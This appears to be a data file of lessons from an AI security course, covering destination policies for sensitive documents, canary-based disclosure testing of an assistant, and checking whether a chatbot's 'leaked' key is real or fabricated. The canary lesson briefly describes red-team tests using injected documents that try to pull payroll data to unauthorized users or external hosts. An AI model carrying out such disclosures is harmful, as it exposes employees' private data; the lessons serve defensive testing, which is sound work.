      { control: 'Tests for both blocked destinations and successful legitimate completion.', enforcementPoint: 'Release checks.', limitation: 'Tests cover anticipated paths only.' },
    ],
    misconception: {
      claim: '"The safest policy is never to let AI agents handle sensitive documents."',
      correction: 'Blanket bans push work to unmanaged tools and give no control. Approved, minimized, destination-enforced workflows are both useful and safer.',
    },
    exercise: {
      kind: 'tabletop',
      prompt: 'Write the destination policy for an HR assistant that drafts offer letters containing salary figures.',
      modelResponse: ['Allowed: portal display to the recruiter; save draft to the HR document system under the candidate\'s folder. Blocked: email (offer is sent from the HR system after approval), external links, web fetch. Evidence: log draft id and recipient folder, not salary content.'],
    },
    sourceIds: ['owasp-llm02', 'owasp-llm06', 'nist-ai-rmf'],
    glossary: ['sensitive-information', 'policy-enforcement-point'],
    related: ['D07-L04', 'D11-L07'],
    conceptTag: 'approved-sensitive-workflows',
  },
  {
    id: 'D03-L09',
    title: 'Testing disclosure with synthetic canaries and permitted-recipient controls',
    summary:
      'Designs disclosure tests that prove or disprove a flow using unique synthetic markers, and checks that permitted recipients still receive data.',
    minutes: 15,
    objectives: [
      'Design canary values that make a specific flow detectable.',
      'Plan where to look for canaries across channels and stores.',
      'Include positive tests for permitted recipients alongside negative tests.',
    ],
    prerequisites: ['D03-L05', 'D03-L06'],
    explanation: [
      p('Disclosure testing asks: can data from location X reach recipient Y? A {{canary}} makes the answer observable. Plant a unique, synthetic string (for example `CANARY-PAY-9Q4X-2026`) in the protected data, try to make it flow, and search every channel for the string.'),
      ul(
        '**Unique:** it must not occur anywhere else, so finding it proves the flow.',
        '**Synthetic and labelled:** never use real secrets or real personal data as canaries; mark them clearly as test data.',
        '**Distinct per location:** use different canaries for different stores so a hit tells you the source.',
        '**Searchable:** pick strings that survive tokenization and formatting (avoid ones a model might "correct").',
      ),
      p('Search beyond the answer: retrieval logs, caches, memory, traces, outbound proxy logs, mail logs and renderer requests. A canary in a proxy log for an external host is a disclosure even if no answer ever showed it.'),
      p('Pair every negative test with a **positive** one: the permitted recipient must still receive the data. If Ravi\'s analysis can no longer see payroll canaries in his approved workflow, the control is broken in the other direction.'),
    ],
    boundary: {
      component: 'Test harness, protected stores and all output channels.',
      trustBoundary: 'The boundary under test (tenant, role, external).',
      attackerControl: 'Simulated by the tester: queries, injected documents and phrasing variations within a stated budget.',
    },
    scenario: {
      title: 'Canary plan for payroll',
      setup: 'Luc designs a test for the payroll workflow approved in [[D03-L08]].',
      evidence: [
        table('Canary plan (synthetic)', ['Canary', 'Planted in', 'Must reach', 'Must not reach'], [
          ['CANARY-PAY-9Q4X', 'PayHub test employee record', 'Ravi\'s approved report (aggregate includes test dept)', 'Any non-payroll user, any external host'],
          ['CANARY-IDX-3M7R', 'HR index test document', 'HR staff search', 'Engineering users'],
          ['CANARY-MEM-8W2D', 'Payroll analyst memory entry', 'That analyst\'s sessions', 'Other users\' sessions'],
        ]),
      ],
    },
    worked: {
      title: 'Running and reading the test',
      blocks: [
        p('Luc runs 40 phrasings from an engineering test account, plus 10 injected documents asking for payroll. He searches answers, retrieval logs, cache, memory and proxy logs.'),
        table('Results', ['Check', 'Result'], [
          ['Engineering answers containing any canary', '0 of 50'],
          ['Engineering retrieval logs with payroll/HR chunks', '0'],
          ['Proxy logs to external hosts containing canaries', '0'],
          ['Ravi\'s approved report includes test dept aggregate', 'Yes (positive control passed)'],
        ]),
        note('"0 of 50" is evidence for these 50 attempts, not proof of impossibility. Report the budget and case mix ([[D11-L06]]).'),
      ],
    },
    controls: [
      { control: 'Synthetic, unique, per-location canaries.', enforcementPoint: 'Test data management.', limitation: 'Paraphrased or summarized leaks may not contain the exact string.' },
      { control: 'Multi-channel search including logs and proxies.', enforcementPoint: 'Test harness.', limitation: 'Uninstrumented channels are blind spots.' },
    ],
    misconception: {
      claim: '"We asked the bot for salaries 50 times and it refused, so payroll cannot leak."',
      correction: 'Refusals in answers do not cover other channels or other phrasings. Canaries searched across stores and outbound logs give evidence, bounded by the test budget.',
    },
    exercise: {
      kind: 'reflection',
      prompt: 'Why can a canary miss a real leak, and how would you complement it?',
      modelResponse: ['A model may paraphrase or summarize ("an employee in test department earns about…") without the exact string. Complement with semantic checks (numeric values, fields) and with structural evidence: retrieval logs showing the record entered an unauthorized context.'],
    },
    sourceIds: ['owasp-llm02', 'owasp-cs-agent', 'arxiv-2406.13352'],
    glossary: ['canary', 'disclosure', 'falsifiable-test'],
    related: ['D11-L03', 'D03-L06'],
    conceptTag: 'canary-testing',
  },
  {
    id: 'D03-L10',
    title: 'Investigating whether a claimed secret disclosure is real or fabricated',
    summary:
      'Verifies purported leaked secrets against protected data before declaring exfiltration, distinguishing fabricated credentials from demonstrated disclosure.',
    minutes: 16,
    objectives: [
      'Verify a claimed leaked secret against the protected value without spreading it.',
      'Distinguish fabricated, partially correct and real disclosures.',
      'Scope the response proportionally to what was actually demonstrated.',
    ],
    prerequisites: ['D03-L05', 'D03-L09'],
    explanation: [
      p('Reports like "the chatbot revealed our admin password" or "it gave me an API key" arrive regularly. Models readily generate plausible-looking secrets: strings with the right prefix and length, invented from patterns in training data. A string that looks like a key is not evidence that a key leaked.'),
      p('Verify before you escalate, and verify safely:'),
      ul(
        '**Compare without spreading:** check whether the claimed value matches the real one using a hash comparison or the secret manager\'s verification, rather than pasting real secrets into tickets.',
        '**Check provenance:** could the real value have been in this context? Look at the trace: was the secret ever in a prompt, tool result, retrieved chunk or memory?',
        '**Check partial matches:** a correct prefix or account name with an invented suffix suggests the model saw structure but not the secret, or that the format is public.',
        '**Check the claimant\'s access:** if they could legitimately read the value, it is not a disclosure.',
      ),
      table('Outcomes', ['Finding', 'Meaning', 'Response'], [
        ['No match, never in context', 'Fabricated secret', 'Reliability issue; no rotation needed; explain to reporter'],
        ['Exact match, was in context', 'Real disclosure', 'Rotate, investigate path and recipients'],
        ['Exact match, never in context', 'Possible leak elsewhere or guessable secret', 'Rotate; investigate other sources; review secret strength'],
        ['Partial match', 'Format or structure exposure', 'Assess what structure reveals; consider rotation'],
      ]),
      warn('Do not confuse a fabricated credential with demonstrated exfiltration. Equally, do not dismiss a report before checking: rotation is cheap compared to a missed real leak.'),
    ],
    boundary: {
      component: 'Investigation process; secret manager; trace store.',
      trustBoundary: 'Claims made in model output versus values in protected stores.',
      attackerControl: 'A reporter (or attacker) can present any string and claim it leaked.',
    },
    scenario: {
      title: '"It gave me the Ledgerline admin key"',
      setup: 'A contractor posts in an internal channel a screenshot of Rocky printing `lgl_live_7Hq2…Xb9` and the caption "ROCKTO\'s AI leaks admin keys!!".',
      evidence: [
        table('Hana\'s checks (synthetic)', ['Check', 'Result'], [
          ['Hash of claimed value vs real admin key (secret manager verify API)', 'No match'],
          ['Prefix `lgl_live_` format', 'Public: documented in Ledgerline\'s developer docs'],
          ['Trace: any secret material in context of that session', 'None; context had only the user question and public docs'],
          ['Any admin key ever placed in Rocky\'s prompts', 'No (config audit)'],
        ]),
      ],
    },
    worked: {
      title: 'Conclusion and communication',
      blocks: [
        p('The string is a fabrication in a public format. Finding: reliability failure (the model produced a convincing fake credential), not a disclosure. Actions: no rotation required; reply to the channel explaining the verification without revealing the real key\'s properties; add an output check that flags credential-like strings so users are warned they are probably fabricated.'),
        p('Had the hash matched, the response would change completely: rotate immediately, then trace how the key reached the context.'),
      ],
    },
    controls: [
      { control: 'Safe verification procedure (hash or verify API) for claimed secrets.', enforcementPoint: 'Incident response runbook.', limitation: 'Requires access to verification tooling; some systems lack a verify endpoint.' },
      { control: 'Output scanner flags credential-shaped strings.', enforcementPoint: 'Output post-processing.', limitation: 'Flags both real and fake; it cannot tell which.' },
    ],
    misconception: {
      claim: '"The AI printed something that looks exactly like our API key format, so the key was leaked."',
      correction: 'Formats are often public and models generate plausible strings. Only a verified match to the protected value, with a plausible path, demonstrates disclosure.',
    },
    exercise: {
      kind: 'reflection',
      prompt: 'Why should you avoid pasting the real secret into the incident ticket to "compare"?',
      modelResponse: ['It creates a new copy of the secret in a system with broader access and longer retention, turning a possibly fake leak into a real one. Compare via hash or the secret manager instead.'],
    },
    sourceIds: ['owasp-llm02', 'owasp-llm09', 'arxiv-2012.07805', 'owasp-cs-secrets'],
    glossary: ['disclosure', 'hallucination', 'memorization'],
    related: ['D08-L06', 'D05-L02'],
    conceptTag: 'verify-claimed-secret',
  },
];

